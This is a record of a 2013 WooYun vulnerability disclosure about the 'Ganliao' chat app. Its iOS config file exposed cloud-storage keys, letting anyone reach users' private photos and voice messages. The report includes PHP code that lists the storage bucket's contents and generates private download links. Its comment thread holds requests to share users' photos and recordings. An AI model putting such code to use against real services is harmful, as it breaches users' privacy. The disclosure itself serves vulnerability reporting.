{"id": 8776, "wybug_id": "wooyun-2013-032103", "wybug_title": "“敢聊”用户照片及语音泄漏等隐私泄露", "wybug_corp": "ruoogle.com.cn", "wybug_author": "小桑", "wybug_date": "2013-07-24 15:53", "wybug_open_date": "2013-10-22 15:54", "wybug_type": "重要资料/文档外泄", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-22：\t细节向公众公开  简要描述： 最近刚流行的“敢聊”APP应用中，用户的语音、照片资料泄漏 详细说明：  在APP的配置文件中保存了云存储（使用的是七牛）的APPKEY、APPSECRET和空间名称、空间域名，显然，有了这些东西，那么用户发送的所有资料，都一览无余。   漏洞证明：  第一、用ITOOLS等工具打开应用。\n\n第二，打开com.ruoogle.gamechat.plist该文件，无法直视啊。。\n\n\n空间地址：GC_Static = \"http://[马赛克].ruoogle.com/\";\n第三、去七牛官网下载SDK，配置好。\nPHP://照片列表$rst = Qiniu_RSF_ListPrefix($client, $bucket,'photo/1','',1000);var_dump($rst);//音频列表$rst = Qiniu_RSF_ListPrefix($client, $bucket,'audio','',1000);var_dump($rst);\n第四、运行\n\n第五、测试,获取文件下载地址\nPHP:$key = isset($_GET['i']) ? $_GET['i'] : 'photo/10022/xxxxxx.jpg';Qiniu_SetKeys($accessKey, $secretKey);$baseUrl = Qiniu_RS_MakeBaseUrl($domain, $key);$getPolicy = new Qiniu_RS_GetPolicy();$privateUrl = $getPolicy->MakeRequest($baseUrl, null);echo '<img src=\"'. $privateUrl .'\" />' . \"\\n\";\n\n\n语音文件同理PS. 遍历下载发现不少鲍照啊。。。。   修复方案：  我不会IOS开发，哈哈哈   版权声明：转载请注明来源 小桑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2013-07-24 19:17 厂商回复： 真的是非常感谢，已经修复！！！！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-24 16:01 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  还有这个东西呀！    \n     2013-07-24 16:06 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  求打包妹子照片及语音    \n     2013-07-24 16:17 |    \t\t小桑 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:1        | 左手倒影 右手年华)\t\t \n  @M0nster 只是测试遍历了前1K条，淡定。    \n     2013-07-24 19:21 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  洞主求妹子照片和录音。    \n     2013-07-24 20:18 |    \t\t小桑 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:1        | 左手倒影 右手年华)\t\t \n  @ruoogle.com.cn 你们的开发这个大意闹的有点的大啊。。如果用户多起来问题就更严重了。    \n     2013-07-24 20:28 |    \t\t小桑 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:1        | 左手倒影 右手年华)\t\t \n  @ruoogle.com.cn 亲啊，重置下secretKey呗，我现在还能访问到呢。。。    \n     2013-07-24 21:20 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  @有妹子送上    \n     2013-07-26 22:46 |    \t\tbyniu \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 成功的两要素：一、坚持不要脸。二、大胆坚...)\t\t \n  语音数据都能获取，太牛逼了。    \n     2013-10-22 18:08 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我去，获取的是云端的？为什么不搞点限制级的大家开心开心……    \n     2013-10-22 18:17 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  用客户端直接连接七牛api......不过七牛如果弄个只允许增加的子Secret其实也是不错的，这样的话对应用开发者比较友好....    \n     2013-10-22 18:50 |    \t\tN1ghtBird \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:21        | _(:з」∠)_)\t\t \n  求secretKey找妹子呀~    \n     2013-10-23 21:41 |    \t\tkid23 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 1+1=10)\t\t \n  其实危害应该不大，APPKEY、APPSECRET等都是存在本机的，通常都是假定本机是安全的。当然文件有权限检查，稍微加个密处理啥的会更好。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}